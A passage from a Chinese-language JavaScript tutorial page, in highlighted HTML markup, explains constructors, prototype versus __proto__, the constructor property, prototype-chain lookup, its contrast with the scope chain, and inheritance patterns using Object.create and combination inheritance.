class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Dog</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = <span class="hljs-string">&quot;Default&quot;</span>;<br>  <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Override&quot;</span> &#125;; <span class="hljs-comment">// 返回这个对象</span><br>&#125;<br><br><span class="hljs-keyword">const</span> d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(d); <span class="hljs-comment">// &#123; name: &quot;Override&quot; &#125;（不是 Dog 实例）</span><br></code></pre></td></tr></table></figure><p><strong>关键注意事项</strong></p><p>（1）忘记 new 的后果</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> p = <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>); <span class="hljs-comment">// 没有 new</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p); <span class="hljs-comment">// undefined（this 会指向全局对象/报错）</span><br></code></pre></td></tr></table></figure><p>（2）防御性编程</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">User</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-comment">// 确保构造函数被正确使用</span><br>  <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">new</span>.<span class="hljs-property">target</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(name); <span class="hljs-comment">// 自动补 new</span><br>  &#125;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-3-实例的-proto-与构造函数的-prototype"><a href="#3-3-实例的-proto-与构造函数的-prototype" class="headerlink" title="3.3 实例的 __proto__ 与构造函数的 prototype"></a>3.3 实例的 <code>__proto__</code> 与构造函数的 <code>prototype</code></h2><p><strong>核心概念对比</strong></p><table><thead><tr><th align="left">特性</th><th align="left">prototype</th><th align="left"><code>__proto__</code></th></tr></thead><tbody><tr><td align="left">归属</td><td align="left">函数对象特有</td><td align="left">所有对象都有</td></tr><tr><td align="left">作用</td><td align="left">构造函数创建实例时的原型模板</td><td align="left">对象实际继承的原型对象</td></tr><tr><td align="left">访问方式</td><td align="left">Constructor.prototype</td><td align="left">Object.getPrototypeOf(obj) 或 <code>obj.__proto__</code></td></tr><tr><td align="left">默认值</td><td align="left">自动创建包含 constructor 属性的对象</td><td align="left">取决于对象创建方式</td></tr><tr><td align="left">标准程度</td><td align="left">ES标准属性</td><td align="left">非标准，已由Object.getPrototypeOf()取代</td></tr></tbody></table><p><strong>两者关系图解</strong></p><pre class="mermaid">graph LR    A[构造函数 Constructor] -->|prototype 属性| B[原型对象 Prototype]    C[实例 instance] -->|"__proto__" 链接| B    B -->|constructor 属性| A    B -->|"__proto__"| D[Object.prototype]    D -->|"__proto__"| E[null]</pre><h2 id="3-4-constructor-属性的意义"><a href="#3-4-constructor-属性的意义" class="headerlink" title="3.4 constructor 属性的意义"></a>3.4 <code>constructor</code> 属性的意义</h2><p>constructor 是原型对象上的一个重要属性，它指向创建当前对象的构造函数。</p><p><strong>基本特性</strong></p><p>（1）默认存在于所有函数对象的 prototype 上</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"></span>) &#123;&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Person</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>（2）实例通过原型链访问</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Person</span>); <span class="hljs-comment">// true（通过原型链访问）</span><br></code></pre></td></tr></table></figure><p><strong>核心作用</strong></p><p>（1）标识对象来源，提供追踪对象是由哪个构造函数创建的路径</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> arr = [];<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Array</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>（2）实现构造函数复用，可以通过 constructor 创建新实例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Car</span>(<span class="hljs-params">make</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">make</span> = make;<br>&#125;<br><br><span class="hljs-keyword">const</span> toyota = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Car</span>(<span class="hljs-string">&#x27;Toyota&#x27;</span>);<br><span class="hljs-keyword">const</span> honda = <span class="hljs-keyword">new</span> toyota.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;Honda&#x27;</span></span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(honda.<span class="hljs-property">make</span>); <span class="hljs-comment">// &quot;Honda&quot;</span><br></code></pre></td></tr></table></figure><p>（3）类型检查的补充</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkType</span>(<span class="hljs-params">obj</span>) &#123;<br>  <span class="hljs-keyword">return</span> obj.<span class="hljs-property">constructor</span>.<span class="hljs-property">name</span>;<br>&#125;<br><span class="hljs-title function_">checkType</span>([]); <span class="hljs-comment">// &quot;Array&quot;</span><br></code></pre></td></tr></table></figure><h1 id="第四章：原型链（Prototype-Chain）"><a href="#第四章：原型链（Prototype-Chain）" class="headerlink" title="第四章：原型链（Prototype Chain）"></a>第四章：原型链（Prototype Chain）</h1><h2 id="4-1-原型链的形成机制"><a href="#4-1-原型链的形成机制" class="headerlink" title="4.1 原型链的形成机制"></a>4.1 原型链的形成机制</h2><p>原型链由对象的 <code>__proto__</code> 链接串联而成，形成一条访问属性和方法的查找路径</p><p><strong>原型链核心组件</strong></p><ol><li>实例对象：包含基本数据和 <code>__proto__</code> 链接</li><li>原型对象：包含共享属性和方法</li><li>链式结构：通过 <code>__proto__</code> 逐级链接形成，终点是 null</li></ol><p><strong>具体形成过程</strong></p><p>（1）构造函数创建时的默认设置</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><br><span class="hljs-comment">// 自动创建的 prototype 对象</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br><span class="hljs-comment">/* &#123;</span><br><span class="hljs-comment"> *   constructor: Person,</span><br><span class="hljs-comment"> *   __proto__: Object.prototype</span><br><span class="hljs-comment"> * &#125;</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><p>(2)实例创建时的原型链建立（<code>new</code> 操作符执行过程）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>);<br><br><span class="hljs-comment">// 实例的原型指向构造函数的prototype</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(p) === <span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);             <span class="hljs-comment">// true</span><br><br><span class="hljs-comment">// 原型对象的constructor指回构造函数</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Person</span>);      <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p><strong>图解</strong></p><pre class="mermaid">graph LR    A[实例] -->|__proto__| B[构造函数的prototype]    B -->|__proto__| C[Object.prototype]    C -->|__proto__| D[null]</pre><h2 id="4-2-属性查找规则：从实例到原型链顶端"><a href="#4-2-属性查找规则：从实例到原型链顶端" class="headerlink" title="4.2 属性查找规则：从实例到原型链顶端"></a>4.2 属性查找规则：从实例到原型链顶端</h2><p><strong>基本查找流程</strong></p><p>当查找对象属性&#x2F;方法时，JavaScript 引擎会按照以下顺序进行查找</p><ol><li>检查实例自身属性：首先在实例对象自身属性中查找，可使用 <code>hasOwnProperty()</code> 验证属性是否为自有</li><li>沿原型链向上查找：如果实例自身没有该属性，则访问 <code>__proto__</code>，重复此过程直到找到属性或到达原型链终点</li><li>终止条件：找到属性立即返回，或到达 null（原型链中断）时返回 undefined</li></ol><p><strong>图解查找流程</strong></p><pre class="mermaid">graph TD    A[访问 obj.property] --> B{obj有自有属性?}    B -->|是| C[返回该属性值]    B -->|否| D[获取 obj.__proto__]    D --> E{proto为null?}    E -->|是| F[返回undefined]    E -->|否| G[在proto对象上查找property]    G --> H{找到属性?}    H -->|是| I[返回属性值]    H -->|否| D</pre><p><strong>示例代码说明</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name; <span class="hljs-comment">// 自有属性</span><br>&#125;<br><br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHi</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">// 原型属性</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>&#125;;<br><br><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>);<br><br><span class="hljs-comment">// 查找过程演示：</span><br>p.<span class="hljs-property">name</span>;    <span class="hljs-comment">// 1. 找到自有属性 → &quot;Alice&quot;</span><br>p.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// 2. 自有无 → Person.prototype找到 → 执行方法</span><br>p.<span class="hljs-property">age</span>;     <span class="hljs-comment">// 3. 自有无 → Person.prototype无 → Object.prototype无 → null → undefined</span><br></code></pre></td></tr></table></figure><h2 id="4-3-原型链的终点：Object-prototype-和-null"><a href="#4-3-原型链的终点：Object-prototype-和-null" class="headerlink" title="4.3 原型链的终点：Object.prototype 和 null"></a>4.3 原型链的终点：<code>Object.prototype</code> 和 <code>null</code></h2><p>JavaScript 的原型链最终会指向两个特殊的终点：</p><ol><li>Object.prototype：所有常规对象的最终原型对象</li><li>null：原型链的真正终点，表示“无原型”</li></ol><p><strong>Object.prototype 的作用</strong></p><p>（1）提供基础对象方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 所有对象继承的方法举例</span><br><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br>obj.<span class="hljs-title function_">toString</span>();      <span class="hljs-comment">// 继承自Object.prototype</span><br>obj.<span class="hljs-title function_">hasOwnProperty</span>(); <span class="hljs-comment">// 继承自Object.prototype</span><br>obj.<span class="hljs-title function_">valueOf</span>();       <span class="hljs-comment">// 继承自Object.prototype</span><br></code></pre></td></tr></table></figure><p>（2）原型链的枢纽站：基本所有原型链都会经过 Object.prototype（Object.create(null)创建的纯净对象除外）</p><p>（3）内置方法的存储库</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br><span class="hljs-comment">/* 包含：</span><br><span class="hljs-comment"> * - constructor: Object()</span><br><span class="hljs-comment"> * - toString()</span><br><span class="hljs-comment"> * - valueOf()</span><br><span class="hljs-comment"> * - hasOwnProperty()</span><br><span class="hljs-comment"> * - isPrototypeOf()</span><br><span class="hljs-comment"> * - ...</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><p><strong>null 的意义</strong></p><p>（1）原型链的终止标识</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)); <span class="hljs-comment">// null</span><br></code></pre></td></tr></table></figure><p>（2）设计目的：表示“无原型”的最终状态，防止原型链查找进入无限循环</p><p>（3）特殊对象的对比</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> normalObj = &#123;&#125;;<br><span class="hljs-keyword">const</span> bareObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;toString&#x27;</span> <span class="hljs-keyword">in</span> normalObj); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;toString&#x27;</span> <span class="hljs-keyword">in</span> bareObj);   <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><h2 id="4-4-原型链-vs-作用域链"><a href="#4-4-原型链-vs-作用域链" class="headerlink" title="4.4 原型链 vs 作用域链"></a>4.4 原型链 vs 作用域链</h2><p><strong>作用域链简述</strong></p><p>作用域链是 JavaScript 中实现变量查找的机制，每个函数执行时都会创建一个上下文，其中包含一个作用域链。作用域链由当前函数的活动对象和所有外层函数的变量对象组成，当查找变量时，JavaScript 引擎会从当前执行作用域开始查找，当前作用域未找到时会沿作用域链向上查找，直到找到变量或达到全局作用域返回 undefined</p><p><strong>两者对比</strong></p><table><thead><tr><th align="left">特性</th><th align="left">原型链</th><th align="left">作用域链</th></tr></thead><tbody><tr><td align="left">目的</td><td align="left">实现对象间的属性&#x2F;方法的共享和继承</td><td align="left">实现变量的查找和访问</td></tr><tr><td align="left">组成</td><td align="left">对象的 <code>__proto__</code>链接形成</td><td align="left">函数执行上下文中的变量对象链</td></tr><tr><td align="left">查找方向</td><td align="left">从实例对象往原型对象方向查找</td><td align="left">从内层函数往外层函数方向查找</td></tr><tr><td align="left">触发时机</td><td align="left">访问对象属性时</td><td align="left">访问变量时</td></tr><tr><td align="left">终点</td><td align="left">null</td><td align="left">全局执行上下文（window&#x2F;global）</td></tr><tr><td align="left">创建方式</td><td align="left">new、Object.create()或 <code>__proto_</code></td><td align="left">通过函数定义和调用</td></tr></tbody></table><p><strong>代码示例</strong></p><p>（1）原型链查找</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, I&#x27;m <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>&#125;;<br><br><span class="hljs-keyword">const</span> john = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;John&#x27;</span>);<br><br><span class="hljs-comment">// 原型链查找过程:</span><br><span class="hljs-comment">// 1. john 自身有 name 属性</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(john.<span class="hljs-property">name</span>); <span class="hljs-comment">// 直接找到</span><br><br><span class="hljs-comment">// 2. john 自身没有 sayHello 方法，查找原型链</span><br>john.<span class="hljs-title function_">sayHello</span>(); <span class="hljs-comment">// 在 Person.prototype 上找到</span><br><br><span class="hljs-comment">// 3. toString 方法查找</span><br><span class="hljs-comment">// john -&gt; Person.prototype -&gt; Object.prototype -&gt; null</span><br>john.<span class="hljs-title function_">toString</span>(); <span class="hljs-comment">// 最终在 Object.prototype 上找到</span><br></code></pre></td></tr></table></figure><p>（2）作用域链查找</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> globalVar = <span class="hljs-string">&#x27;global&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">outer</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> outerVar = <span class="hljs-string">&#x27;outer&#x27;</span>;<br>  <br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">inner</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> innerVar = <span class="hljs-string">&#x27;inner&#x27;</span>;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(innerVar);    <span class="hljs-comment">// 当前作用域找到</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(outerVar);    <span class="hljs-comment">// 外层作用域找到</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(globalVar);   <span class="hljs-comment">// 全局作用域找到</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(notDefined);  <span class="hljs-comment">// 报错，所有作用域都找不到</span><br>  &#125;<br>  <br>  <span class="hljs-title function_">inner</span>();<br>&#125;<br><br><span class="hljs-title function_">outer</span>();<br></code></pre></td></tr></table></figure><h1 id="第五章：继承与原型链"><a href="#第五章：继承与原型链" class="headerlink" title="第五章：继承与原型链"></a>第五章：继承与原型链</h1><h2 id="5-1-基于原型的继承实现（Object-create）"><a href="#5-1-基于原型的继承实现（Object-create）" class="headerlink" title="5.1 基于原型的继承实现（Object.create）"></a>5.1 基于原型的继承实现（Object.create）</h2><p><strong>代码实现</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> animal = &#123;<br>  <span class="hljs-attr">init</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;,<br>  <span class="hljs-attr">getName</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>;<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> dog = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(animal);<br>dog.<span class="hljs-property">bark</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Woof!&#x27;</span>;<br>&#125;;<br><br><span class="hljs-keyword">const</span> myDog = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(dog);<br>myDog.<span class="hljs-title function_">init</span>(<span class="hljs-string">&#x27;Buddy&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myDog.<span class="hljs-title function_">getName</span>()); <span class="hljs-comment">// &quot;Buddy&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myDog.<span class="hljs-title function_">bark</span>());    <span class="hljs-comment">// &quot;Woof!&quot;</span><br></code></pre></td></tr></table></figure><p><strong>特点</strong></p><ul><li>更纯粹的原型继承，不需要构造函数</li><li>适合简单对象继承场景</li><li>无法实现私有属性和方法</li></ul><h2 id="5-2-组合继承（构造函数-原型链）"><a href="#5-2-组合继承（构造函数-原型链）" class="headerlink" title="5.2 组合继承（构造函数 + 原型链）"></a>5.2 组合继承（构造函数 + 原型链）</h2><p><strong>代码实现</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 父类</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">colors</span> = [<span class="hljs-string">&#x27;black&#x27;</span>, <span class="hljs-string">&#x27;white&#x27;</span>];<br>&#125;<br><br><span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">getName</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>;<br>&#125;;<br><br><span class="hljs-comment">// 子类</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Dog</span>(<span class="hljs-params">name, age</span>) &#123;<br>  <span class="hljs-title class_">Animal</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name); <span class="hljs-comment">// 调用父类构造函数，继承实例属性</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>&#125;<br><br><span class="hljs-comment">// 设置原型链继承</span><br><span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br><span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Dog</span>; <span class="hljs-comment">// 修复构造函数指向</span><br><br><span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">bark</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Woof!&#x27;</span>;<br>&#125;;<br><br><span class="hljs-comment">// 使用</span><br><span class="hljs-keyword">const</span> dog1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&#x27;Buddy&#x27;</span>, <span class="hljs-number">2</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dog1.<span class="hljs-title function_">getName</span>()); <span class="hljs-comment">// &quot;Buddy&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dog1.<span class="hljs-title function_">bark</span>());   <span class="hljs-comment">// &quot;Woof!&quot;</span><br></code></pre></td></tr></table></figure><p><strong>关键点分析</strong></p><ul><li>Animal.call(this, name) 实现实例属性的继承（类似其他语言的 super()）</li><li>Object.create(Animal.prototype) 创建以父类原型为原型的新对象，避免直接赋值导致原型污染</li><li>修复 constructor 属性保证对象类型正确识别</li></ul><h2 id="5-3-寄生组合继承（优化方案）"><a href="#5-3-寄生组合继承（优化方案）" class="headerlink" title="5.3 寄生组合继承（优化方案）"></a>5.3 寄生组合继承（优化方案）</h2><p><strong>代码实现</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">inheritPrototype</span>(<span class="hljs-params">child, parent</span>) &#123;<br>  <span 